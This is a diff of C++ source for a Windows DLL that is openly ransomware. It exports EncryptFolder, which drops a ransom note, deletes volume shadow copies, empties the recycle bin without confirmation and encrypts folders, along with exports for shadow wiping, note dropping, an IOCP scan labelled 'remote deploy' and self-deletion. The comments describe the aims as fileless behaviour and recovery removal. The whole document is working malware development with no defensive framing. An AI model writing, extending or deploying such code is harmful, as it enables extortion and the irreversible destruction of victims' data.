@@ -1,15 +1,12 @@
-// encryptor_dll.cpp
+
+
 
 #include <windows.h>
 #include <string>
 #include "config.h"
 #include "Base64.h"
 #include "data_wipe.h"
-#include "io_control.h:"
-// #include "misc.h"
-// #include "ntru_crypto.h"
-// #include "crypto_functions.h"
-// #include "fast_crypt.h"
+#include "io_control.h"
 
 // DLL export macro
 #ifdef BUILD_DLL
@@ -18,57 +15,86 @@
 #define DLL_EXPORT extern "C" __declspec(dllimport)
 #endif
 
-// Declare any global variables, structures, etc. as in your original file
-std::wstring wNoteString;
-
-// Forward declarations for helpers (implementations should be in other files)
+// Forward declarations
 void getUserNote(std::wstring& note);
 void SearchFolder(const std::wstring& folderPath);
-// Optionally, if SelfDelete2 is used, declare it here
 void SelfDelete2();
+void removeShadows();
+void DoIOCP(LPWSTR* lpwParams, int paramsCount);
+bool isCpuAesSupports();
 
-// DllMain: Optional DLL entry point (no-op here)
+// Globals
+std::wstring wNoteString;
+
+// Optional DLL entry point
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
-        // Optional: Initialization code here
-        DisableThreadLibraryCalls(hinstDLL); // Avoid thread attach/detach notifications
+        DisableThreadLibraryCalls(hinstDLL);
         break;
     case DLL_PROCESS_DETACH:
-        // Optional: Cleanup code here
         break;
     }
     return TRUE;
 }
 
-// Exported function: Start encryption given a folder path
+// Encrypt and wipe function - Fileless behavior
 DLL_EXPORT void EncryptFolder(const wchar_t* folderPath) {
-    // Initialize COM, error mode, etc. as in original WinMain
-    HRESULT hr = CoInitialize(NULL);
-    if (FAILED(hr)) {
-        // Could log or handle error here
-        return;
-    }
-    SetErrorMode(SEM_FAILCRITICALERRORS);
+    if (!folderPath || !*folderPath) return;
 
-    // Prepare ransom note, etc.
+    if (FAILED(CoInitialize(NULL))) return;
+
+    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);
+
     getUserNote(wNoteString);
 
-    // Start encryption search
-    if (folderPath && *folderPath) {
-        std::wstring wpath(folderPath);
-        SearchFolder(wpath);
-    }
+    // Shadow removal, recycle bin purge, token downgrade
+#ifndef _DEBUG
+    removeShadows();
+    SHEmptyRecycleBinA(nullptr, nullptr, SHERB_NOCONFIRMATION);
+#endif
 
-    // Optionally: SelfDelete2(); or other cleanup
-    // Uncomment if self-deletion is required
-    // SelfDelete2();
+    std::wstring wpath(folderPath);
+    SearchFolder(wpath);
 
     CoUninitialize();
 }
 
-// Optionally, export other functions as needed
-// DLL_EXPORT void SomeOtherFunction(...);
+// Manual trigger for IOCP + remote deploy config
+DLL_EXPORT void StartIOCPScan() {
+    if (FAILED(CoInitialize(NULL))) return;
+    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);
 
-// All other code (helpers, SearchFolder, etc.) is implemented as in your original file
+    getUserNote(wNoteString);
 
+    LPWSTR dummyParams[] = { (LPWSTR)L"dllentry", nullptr };
+    DoIOCP(dummyParams, 1);
+
+    CoUninitialize();
+}
+
+// Expose shadow wipe manually
+DLL_EXPORT void WipeVolumeShadows() {
+    if (FAILED(CoInitialize(NULL))) return;
+    removeShadows();
+    CoUninitialize();
+}
+
+// Optional manual note dropper (for decoy or ransom note fileless drop)
+DLL_EXPORT void DropNoteInFolder(const wchar_t* folderPath) {
+    if (!folderPath || !*folderPath) return;
+    std::wstring notePath = std::wstring(folderPath) + L"\\" + LOCKED_NOTE;
+    getUserNote(wNoteString);
+
+    DWORD dwWritten;
+    HANDLE hFile = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        WriteFile(hFile, wNoteString.c_str(), (DWORD)(wNoteString.length() * sizeof(wchar_t)), &dwWritten, nullptr);
+        CloseHandle(hFile);
+    }
+}
+
+// Self-delete the DLL loader process if needed
+DLL_EXPORT void SelfDelete() {
+    SelfDelete2();
+}
